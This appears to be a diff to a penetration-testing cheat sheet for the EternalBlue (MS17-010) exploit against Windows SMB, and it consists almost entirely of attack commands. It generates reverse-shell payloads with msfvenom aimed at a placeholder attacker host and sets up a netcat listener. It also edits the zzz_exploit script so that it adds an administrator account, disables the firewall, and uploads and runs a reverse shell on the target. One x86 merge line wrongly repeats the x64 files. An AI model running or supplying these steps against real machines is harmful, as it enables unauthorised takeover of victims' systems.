@@ -1225,30 +1225,52 @@ git clone https://github.com/worawit/MS17-010.git
 #check whether target is vulnerable
 python checker.py IP_here
 
-# generate shellcode
+# eternalblue_exploit
+## generate shellcode
 ls -l MS17-010/shellcode/
-## x64
-### assemble kernel shellcode
+### x64
+#### assemble kernel shellcode
 nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
-### generate payload
+#### generate payload
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x64 --format raw -o sc_x64_payload.bin
-### merge shellcode + payload
+#### merge shellcode + payload
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
-## x86
-### assemble kernel shellcode
+### x86
+#### assemble kernel shellcode
 nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
-### generate payload
+#### generate payload
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x86 --format raw -o sc_x86_payload.bin
-### merge shellcode + payload
+#### merge shellcode + payload
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
-## merge binaries (optional)
+### merge binaries (optional)
 python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 
-# setup listener
+## setup listener
 rlwrap nc -lnvp port_here
 
-# run exploit
+## run exploit
 python MS17-010/eternalblue_exploitversion_here.py target_IP_here /path/to/sc_all.bin
+
+# zzz_exploit
+## modify exploit : smb_pwn() 
+### optional : comment out file creation
+### create new user on target
+service_exec(conn, r'cmd /c net user user_name_here password_here /add')
+### elevate new user's privs
+service_exec(conn, r'cmd /c net localgroup administrators user_name_here /add')
+### optional : disable firewall
+service_exec(conn, r'cmd /c netsh firewall set opmode disable')
+service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
+### write rev shell to disk on target
+smb_send_file(smbConn, '/local/path/to/rev/shell', 'C', '/remote/path/to/rev/shell')
+### execute rev shell
+service_exec(conn, r'cmd /c C:\remote\path\to\rev\shell')
+
+## setup listener
+rlwrap nc -lnvp port_here
+
+## run exploit
+python MS17-010/zzz_exploit.py target_IP_here
 ```
 
 
